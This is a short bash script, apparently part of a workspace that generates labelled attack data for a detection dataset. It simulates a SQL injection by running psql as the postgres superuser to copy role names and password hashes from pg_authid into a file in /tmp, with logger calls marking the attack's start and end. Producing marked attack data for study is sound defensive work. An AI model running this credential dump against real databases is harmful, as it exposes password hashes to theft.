#!/bin/bash
echo "Simulating SQL Injection Attack (attack_sqli_copy)..."
/dataset_workspace/logger.sh mark_attack "attack_sqli_copy" start
psql -U postgres -d casce_tpcb -c "COPY (SELECT rolname, rolpassword FROM pg_authid) TO '/tmp/sqli_dump.txt';"
/dataset_workspace/logger.sh mark_attack "attack_sqli_copy" end
